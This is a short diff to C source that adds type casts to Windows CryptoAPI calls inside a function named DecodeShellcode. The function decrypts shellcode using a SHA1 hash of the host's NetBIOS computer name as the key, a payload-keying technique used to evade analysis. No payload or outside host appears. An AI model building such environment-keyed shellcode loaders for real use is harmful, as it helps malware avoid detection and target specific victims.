@@ -119,7 +119,7 @@ void DecodeShellcode() {
 	unsigned int hc = 0; // Hash position marker
 
 	// Get the computer name (to be used as a decryption key)
-	if (cn = GetComputerInfo(ComputerNamePhysicalNetBIOS)) {
+	if (cn = (char *) GetComputerInfo(ComputerNamePhysicalNetBIOS)) {
 		if (cnhash = GenerateHash(cn, strlen(cn))) {
 			
 			// Loop through the shellcode
@@ -244,10 +244,10 @@ HGLOBAL GenerateHash(BYTE *src, unsigned int len) {
 	HGLOBAL ret = { 0 };
 
 	// Acquire a handle to the general key container
-	if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, NULL)) {
+	if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, (DWORD) NULL)) {
 
 		// Generate a handle to the SHA1 hash type that we want
-		if (CryptCreateHash(hProv, CALG_SHA1, NULL, NULL, &hHash)) {
+		if (CryptCreateHash(hProv, CALG_SHA1, (HCRYPTKEY) NULL, (DWORD) NULL, &hHash)) {
 
 			// Hash the data
 			if (CryptHashData(hHash, src, len, NULL)) {
@@ -256,7 +256,7 @@ HGLOBAL GenerateHash(BYTE *src, unsigned int len) {
 				// easier and more resilient to changes in hash algorithm choice etc. Therefore,
 				// request the hash size from the CryptoAPI and make sure its 20 bytes (160 bit)
 				hash_size_needed_len = 4;
-				if (CryptGetHashParam(hHash, HP_HASHSIZE, &hash_size_needed, &hash_size_needed_len, NULL) && hash_size_needed == 20) {
+				if (CryptGetHashParam(hHash, HP_HASHSIZE, &hash_size_needed, &hash_size_needed_len, (DWORD) NULL) && hash_size_needed == 20) {
 
 					// Now allocate memory for the hash
 					if (hash_value = calloc(hash_size_needed, 1)) {
